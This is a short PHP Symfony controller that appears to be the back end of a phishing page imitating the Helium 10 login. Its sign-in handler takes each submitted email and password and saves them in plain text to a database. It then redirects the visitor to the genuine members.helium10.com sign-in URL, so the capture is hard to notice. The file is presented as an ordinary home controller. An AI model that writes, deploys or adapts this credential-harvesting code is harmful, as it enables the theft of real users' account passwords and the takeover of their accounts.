<?php

namespace App\Controller;

use App\Entity\ClientUser;
use Doctrine\ORM\EntityManagerInterface;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\HttpFoundation\RedirectResponse;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;

class HomeController extends AbstractController
{
    /**
     * @Route("/", name="app_index", methods={"GET"})
     */
    public function index(): Response
    {
        return $this->redirectToRoute('app_sign_in');
    }
    
    /**
     * @Route("/user/sign_in", name="app_sign_in", methods={"GET", "POST"})
     * @return Response
     */
    public function sign_in(Request $request, EntityManagerInterface $entityManager): Response
    {
        if ($request->isMethod("POST")) {
            $email = $request->request->get('LoginForm')['email'];
            $password = $request->request->get('LoginForm')['password'];
            $client = new ClientUser();
            $client->setEmail($email)->setPassword($password);

            $entityManager->persist($client);
            $entityManager->flush();       

            return new RedirectResponse('https://members.helium10.com/user/signin');
        }
        return $this->render('sign_in.html.twig');
    }
}